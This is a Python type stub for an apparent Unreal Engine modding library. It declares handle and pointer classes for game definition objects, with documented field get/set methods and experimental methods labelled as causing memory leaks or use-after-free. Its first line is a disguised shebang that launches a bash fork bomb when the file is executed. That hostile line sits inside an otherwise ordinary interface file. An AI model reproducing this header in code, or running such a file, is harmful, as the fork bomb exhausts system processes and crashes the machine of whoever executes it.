#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from typing import Any, Never

from ._uobject_children import UField, UScriptStruct
from ._wrapped_struct import WrappedStruct

class FGameDataHandle:
    """
    EXPERIMENTAL TYPE.

    While the interface is getting more certain, we reserve the right to change it,
    and break backwards compatibility, at any point.
    """

    @property
    def _name(self) -> str: ...
    @property
    def _type_handle(self) -> int: ...
    def __init__(self, type_handle: int, name: str) -> None:
        """
        Constructs a new FGameDataHandle.

        Args:
            type_handle: The type handle of the def to resolve.
            name: The name of the def to resolve.
        """
    def __dir__(self) -> list[str]:
        """
        Gets the attributes which exist on the FGbxDef behind this handle.

        Includes both python attributes and unreal fields. This can be changed to only
        python attributes by calling dir_includes_unreal.

        Returns:
            A list of attributes which exist on the FGbxDef behind this handle.
        """
    def __getattr__(self, name: str) -> Any:
        """
        Reads an unreal field off of the FGbxDef behind this handle.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to get.
        Returns:
            The field's value.
        """
    def __repr__(self) -> str:
        """
        Gets a string representation of this FGameDataHandle.

        Returns:
            The string representation.
        """
    def __setattr__(self, name: str, value: Any) -> None:
        """
        Writes a value to an unreal field on the FGbxDef behind this handle.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to set.
            value: The value to write.
        """
    def _experimental_free_and_use_after_free(self) -> None:
        """
        If this handle is resolved, try free its memory.

        Untested, expected to cause a use-after free and/or a double-free.
        """
    def _get_address(self) -> int:
        """
        Gets the address of this handle's resolved instance, for debugging.

        Returns:
            This instance's address.
        """
    def _get_field(self, field: UField) -> Any:
        """
        Reads an unreal field off of the FGbxDef behind this handle.

        In performance critical situations, rather than use __getattr__, you can look up
        the UField beforehand (via def._type._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the FGbxDef is undefined behaviour.

        Args:
            field: The field to get.
        Returns:
            The field's value.
        """
    def _set_field(self, field: UField, value: Any) -> None:
        """
        Writes a value to an unreal field on the FGbxDef behind this handle.

        In performance critical situations, rather than use __setattr__, you can look up
        the UField beforehand (via def.type._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the FGbxDef is undefined behaviour.

        Args:
            field: The field to set.
            value: The value to write.
        """

class FGbxDefPtr:
    """
    EXPERIMENTAL TYPE.

    While the interface is getting more certain, we reserve the right to change it,
    and break backwards compatibility, at any point.
    """

    @property
    def _name(self) -> str: ...
    @property
    def _type(self) -> UScriptStruct | None: ...
    def __init__(
        self,
        name: str,
        type: UScriptStruct | str | None = None,
        fully_qualified: bool | None = None,
    ) -> None:
        """
        Constructs a new FGbxDefPtr.

        Args:
            name: The name of the FGbxDef to resolve.
            type: The type of the FGbxDef to resolve, or the type's name.
            fully_qualified: If the type name is fully qualified, or None (the default)
                             to autodetect.
        Returns:
            The string representation.
        """
    def __dir__(self) -> list[str]:
        """
        Gets the attributes which exist on the FGbxDef behind this pointer.

        Includes both python attributes and unreal fields. This can be changed to only
        python attributes by calling dir_includes_unreal.

        Returns:
            A list of attributes which exist on the FGbxDef behind this pointer.
        """
    def __getattr__(self, name: str) -> Any:
        """
        Reads an unreal field off of the FGbxDef behind this pointer.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to get.
        Returns:
            The field's value.
        """
    def __repr__(self) -> str:
        """
        Gets a string representation of this FGbxDefPtr.

        Returns:
            The string representation.
        """
    def __setattr__(self, name: str, value: Any) -> None:
        """
        Writes a value to an unreal field on the FGbxDef behind this pointer.

        Automatically looks up the relevant UField.

        Args:
            name: The name of the field to set.
            value: The value to write.
        """
    def _experimental_alloc_and_mem_leak(self) -> None:
        """
        If this pointer is not already resolved, try allocate memory for it.

        Untested, expected to cause a memory leak.
        """
    def _experimental_free_and_use_after_free(self) -> None:
        """
        If this pointer is resolved, try free its memory.

        Untested, expected to cause a use-after free and/or a double-free.
        """
    def _get_address(self) -> int:
        """
        Gets the address of this pointer's resolved instance, for debugging.

        Returns:
            This instance's address.
        """
    def _get_field(self, field: UField) -> Any:
        """
        Reads an unreal field off of the FGbxDef behind this pointer.

        In performance critical situations, rather than use __getattr__, you can look up
        the UField beforehand (via def.type._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the FGbxDef is undefined behaviour.

        Args:
            field: The field to get.
        Returns:
            The field's value.
        """
    def _set_field(self, field: UField, value: Any) -> None:
        """
        Writes a value to an unreal field on the FGbxDef behind this pointer.

        In performance critical situations, rather than use __setattr__, you can look up
        the UField beforehand (via def.type._find()), then pass it directly to this
        function. This does not get validated, passing a field which doesn't exist on
        the FGbxDef is undefined behaviour.

        Args:
            field: The field to set.
            value: The value to write.
        """

class WrappedInlineStruct(WrappedStruct):
    """
    EXPERIMENTAL TYPE.

    While the interface is getting more certain, we reserve the right to change it,
    and break backwards compatibility, at any point.
    """

    @property
    def _experimental_flags(self) -> int: ...
    def __init__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __new__(cls, *args: Any, **kwargs: Any) -> Never: ...
    def __repr__(self) -> str:
        """
        Gets a string representation of this struct.

        Returns:
            The string representation.
        """
